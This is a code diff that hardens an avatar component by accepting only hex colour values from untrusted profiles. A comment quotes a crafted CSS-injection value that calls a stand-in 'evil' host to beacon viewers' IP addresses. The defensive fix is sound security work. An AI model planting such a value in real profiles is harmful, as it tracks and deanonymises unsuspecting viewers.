@@ -26,7 +26,11 @@ window.AvSymbol = AvSymbol;
 // ── the canonical avatar renderer ──
 // av = { kind:'monogram'|'symbol', color, symbol }, name used for monogram initial
 function UserAvatar({ av, name, size = 44, ring = false }) {
-  const color = (av && av.color) || '#5E8C6A';
+  // av.color comes from an untrusted kind-0 profile and is interpolated straight into CSS below (boxShadow +
+  // the gradient). Accept ONLY a hex literal, so a crafted value like "#fff),url(https://evil/beacon?p=…)/*"
+  // can't smuggle a url() into background and beacon every viewer's IP/online-status (deanonymisation vector).
+  const _rawColor = (av && av.color) || '';
+  const color = /^#[0-9a-fA-F]{3,8}$/.test(_rawColor) ? _rawColor : '#5E8C6A';
   const initial = (name && name.trim()) ? name.trim()[0].toUpperCase() : null;
   const shadow = ring ? `0 0 0 3px var(--surface), 0 0 0 4.5px ${color}` : 'none';
   // uploaded photo — only ever offered when the church enables member photos AND the member isn't a minor
